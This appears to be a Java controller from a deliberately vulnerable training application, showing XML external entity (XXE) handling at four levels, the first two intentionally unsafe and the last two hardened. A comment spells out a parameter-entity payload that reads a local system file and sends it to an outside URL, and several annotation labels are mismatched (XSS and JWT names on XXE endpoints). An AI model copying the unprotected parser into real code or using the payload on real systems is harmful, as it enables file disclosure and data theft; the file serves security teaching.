package org.sasanlabs.service.vulnerability.xxe;

import java.io.IOException;
import java.io.InputStream;
import javax.servlet.http.HttpServletRequest;
import javax.xml.bind.JAXBContext;
import javax.xml.bind.JAXBElement;
import javax.xml.bind.JAXBException;
import javax.xml.parsers.ParserConfigurationException;
import javax.xml.parsers.SAXParserFactory;
import javax.xml.transform.Source;
import javax.xml.transform.sax.SAXSource;
import org.sasanlabs.internal.utility.LevelConstants;
import org.sasanlabs.internal.utility.annotations.AttackVector;
import org.sasanlabs.internal.utility.annotations.ResponseType;
import org.sasanlabs.internal.utility.annotations.VulnerableAppRequestMapping;
import org.sasanlabs.internal.utility.annotations.VulnerableAppRestController;
import org.sasanlabs.service.vulnerability.xxe.bean.Book;
import org.sasanlabs.service.vulnerability.xxe.bean.ObjectFactory;
import org.sasanlabs.service.vulnerability.xxe.dao.BookEntity;
import org.sasanlabs.service.vulnerability.xxe.dao.BookEntityRepository;
import org.sasanlabs.vulnerability.types.VulnerabilitySubType;
import org.sasanlabs.vulnerability.types.VulnerabilityType;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.xml.sax.InputSource;
import org.xml.sax.SAXException;

/**
 * Resources referred while writing this Vulnerability. <br>
 * General XXE: <br>
 * 1. https://www.youtube.com/watch?v=DREgLWZqMWg <br>
 * 2. https://portswigger.net/web-security/xxe <br>
 * 3. https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9 <br>
 *
 * <p>Parameter Entities attack:<br>
 * 1. https://securitylab.github.com/research/restlet_xxe_vulnerability_CVE-2017-14949 <br>
 *
 * <p>Prevention technique: <br>
 * 1.
 * https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.md1
 * <br>
 *
 * @author KSASAN preetkaran20@gmail.com
 */
@VulnerableAppRestController(
        descriptionLabel = "JWT_INJECTION_VULNERABILITY",
        value = "XXEVulnerability",
        type = {VulnerabilityType.XXE})
public class XXEVulnerability {

    private BookEntityRepository bookEntityRepository;

    @Autowired
    public XXEVulnerability(BookEntityRepository bookEntityRepository) {
        this.bookEntityRepository = bookEntityRepository;
    }

    // No XXE protection
    @AttackVector(
            vulnerabilityExposed = VulnerabilitySubType.REFLECTED_XSS,
            description = "XSS_DIRECT_INPUT_DIV_TAG")
    @VulnerableAppRequestMapping(
            value = LevelConstants.LEVEL_1,
            descriptionLabel = "URL_PARAMETER_CONTAINING_HTML_TAG_ALL_PARAMETER_CONSIDERED",
            htmlTemplate = "LEVEL/XSS",
            responseType = ResponseType.HTML_TAGS_ONLY)
    public ResponseEntity<Book> getVulnerablePayloadLevel1(HttpServletRequest request)
            throws IOException, JAXBException {
        InputStream in = request.getInputStream();
        JAXBContext jc = JAXBContext.newInstance(ObjectFactory.class);
        @SuppressWarnings("unchecked")
        JAXBElement<Book> bookJaxbElement =
                (JAXBElement<Book>) (jc.createUnmarshaller().unmarshal(in));
        BookEntity bookEntity = new BookEntity(bookJaxbElement.getValue(), LevelConstants.LEVEL_1);
        bookEntityRepository.save(bookEntity);
        return new ResponseEntity<Book>(bookJaxbElement.getValue(), HttpStatus.OK);
    }

    // Case insensitive DOCTYPE is not allowed so therefore not adding a level for that.
    // if external-parameter-entities are allowed then those parameter entities can
    // cause harm like:
    /*
     * <!ENTITY % file SYSTEM "file:///etc/notify.conf">
     * <!ENTITY % eval
     * "<!ENTITY &#x25; exfiltrate SYSTEM 'https://www.google.com/?x=%file;'>">
     * <!ENTITY xxe 'file:///etc/notify.conf'> %eval; %exfiltrate;
     */

    /*
     * <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE root [ <!ENTITY % param1
     * SYSTEM "<file location refering DTD which has some code like above.>">
     *
     * %param1; ]> <book> <name>singh</name> <isbn>isbn</isbn>
     * <author>author</author> <publisher>exf</publisher> </book>
     */
    // Only Disabling General Entities cannot stop the XXE as General Parameter entities can cause
    // harmful attacks
    // Like sending internal information to attacker controlled Website http outbound call.
    @AttackVector(
            vulnerabilityExposed = VulnerabilitySubType.XXE,
            description = "XSS_DIRECT_INPUT_DIV_TAG")
    @VulnerableAppRequestMapping(
            value = LevelConstants.LEVEL_2,
            descriptionLabel = "URL_PARAMETER_CONTAINING_HTML_TAG_ALL_PARAMETER_CONSIDERED",
            htmlTemplate = "LEVEL/XSS",
            responseType = ResponseType.HTML_TAGS_ONLY)
    public ResponseEntity<Book> getVulnerablePayloadLevel2(HttpServletRequest request)
            throws IOException, JAXBException, ParserConfigurationException, SAXException {
        InputStream in = request.getInputStream();
        JAXBContext jc = JAXBContext.newInstance(ObjectFactory.class);
        // Disable XXE
        SAXParserFactory spf = SAXParserFactory.newInstance();
        spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
        Source xmlSource = new SAXSource(spf.newSAXParser().getXMLReader(), new InputSource(in));
        @SuppressWarnings("unchecked")
        JAXBElement<Book> bookJaxbElement =
                (JAXBElement<Book>) (jc.createUnmarshaller().unmarshal(xmlSource));
        BookEntity bookEntity = new BookEntity(bookJaxbElement.getValue(), LevelConstants.LEVEL_2);
        bookEntityRepository.save(bookEntity);
        return new ResponseEntity<Book>(bookJaxbElement.getValue(), HttpStatus.OK);
    }

    // Protects against all XXE attacks. This is the configuration which is needed in case
    // application requires DOCTYPE declarations.
    @AttackVector(
            vulnerabilityExposed = VulnerabilitySubType.XXE,
            description = "XSS_DIRECT_INPUT_DIV_TAG")
    @VulnerableAppRequestMapping(
            value = LevelConstants.LEVEL_3,
            descriptionLabel = "URL_PARAMETER_CONTAINING_HTML_TAG_ALL_PARAMETER_CONSIDERED",
            htmlTemplate = "LEVEL/XSS",
            responseType = ResponseType.HTML_TAGS_ONLY)
    public ResponseEntity<Book> getVulnerablePayloadLevel3(HttpServletRequest request)
            throws IOException, JAXBException, ParserConfigurationException, SAXException {
        InputStream in = request.getInputStream();
        JAXBContext jc = JAXBContext.newInstance(ObjectFactory.class);
        // Disable XXE
        SAXParserFactory spf = SAXParserFactory.newInstance();
        spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
        spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

        // Do unmarshall operation
        Source xmlSource = new SAXSource(spf.newSAXParser().getXMLReader(), new InputSource(in));
        @SuppressWarnings("unchecked")
        JAXBElement<Book> bookJaxbElement =
                (JAXBElement<Book>) (jc.createUnmarshaller().unmarshal(xmlSource));
        BookEntity bookEntity = new BookEntity(bookJaxbElement.getValue(), LevelConstants.LEVEL_3);
        bookEntityRepository.save(bookEntity);
        return new ResponseEntity<Book>(bookJaxbElement.getValue(), HttpStatus.OK);
    }

    // Protects against XXE. This is the configuration where DOCTYPE declaration is not required.
    @AttackVector(
            vulnerabilityExposed = VulnerabilitySubType.XXE,
            description = "XSS_DIRECT_INPUT_DIV_TAG")
    @VulnerableAppRequestMapping(
            value = LevelConstants.LEVEL_4,
            descriptionLabel = "URL_PARAMETER_CONTAINING_HTML_TAG_ALL_PARAMETER_CONSIDERED",
            htmlTemplate = "LEVEL/XSS",
            responseType = ResponseType.HTML_TAGS_ONLY)
    public ResponseEntity<Book> getVulnerablePayloadLevel4(HttpServletRequest request)
            throws IOException, JAXBException, ParserConfigurationException, SAXException {
        InputStream in = request.getInputStream();
        JAXBContext jc = JAXBContext.newInstance(ObjectFactory.class);
        // Disable XXE
        SAXParserFactory spf = SAXParserFactory.newInstance();
        // This alone could work and doesn't require external entities and general entities flags.
        spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
        spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        spf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
        // Do unmarshall operation
        Source xmlSource = new SAXSource(spf.newSAXParser().getXMLReader(), new InputSource(in));
        @SuppressWarnings("unchecked")
        JAXBElement<Book> bookJaxbElement =
                (JAXBElement<Book>) (jc.createUnmarshaller().unmarshal(xmlSource));
        BookEntity bookEntity = new BookEntity(bookJaxbElement.getValue(), LevelConstants.LEVEL_4);
        bookEntityRepository.save(bookEntity);
        return new ResponseEntity<Book>(bookJaxbElement.getValue(), HttpStatus.OK);
    }
}
